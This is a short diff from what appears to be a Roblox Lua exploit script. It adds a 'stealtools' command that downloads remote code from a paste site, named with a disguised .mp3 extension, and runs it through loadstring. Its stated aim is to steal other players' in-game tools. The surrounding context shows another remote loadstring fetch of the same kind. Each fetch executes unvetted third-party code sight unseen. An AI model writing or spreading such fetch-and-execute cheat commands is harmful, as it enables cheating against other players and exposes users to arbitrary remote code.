@@ -1468,8 +1468,8 @@ loadstring(game:HttpGet("https://pastefy.app/PAlRXy9c/raw",true))()
 end)
 
 
-
-
+cmd.add({"stealtools", "stealplayertools", "steal"}, {"stealtools (steal, stealplayertools)", "steals tools"}, function() loadstring(game:HttpGet("https://pastecode.dev/raw/ulkmxwj3/toolstealer_lulaslollipop.mp3",true))()
+end)
 
 
 
